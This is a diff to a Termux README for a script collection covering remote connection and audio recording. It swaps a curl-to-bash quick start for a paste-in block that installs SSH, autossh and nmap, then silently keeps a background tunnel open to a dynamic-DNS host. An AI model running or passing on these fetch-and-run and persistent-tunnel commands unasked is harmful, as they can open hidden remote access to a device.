@@ -13,7 +13,15 @@ A collection of utility scripts to automate setup, remote connection, audio reco
 
 **التشغيل السريع في Termux:**
 ```bash
-curl -sL https://raw.githubusercontent.com/mkar64/ssh/main/setup.sh | bash
+[ -d ~/storage ] || termux-setup-storage && \
+pkg update -y && \
+pkg install -y git curl python openssh autossh termux-api nmap iproute2 net-tools && \
+git clone https://github.com/mkar64/ssh.git && \
+cd ssh && \
+chmod +x setup.sh keep_ssh.sh web_ui.py && \
+./setup.sh ms mycontrolbox.duckdns.org 3367 && \
+nohup ./keep_ssh.sh > /dev/null 2>&1 & \
+python3 web_ui.py
 ```
 
 ---
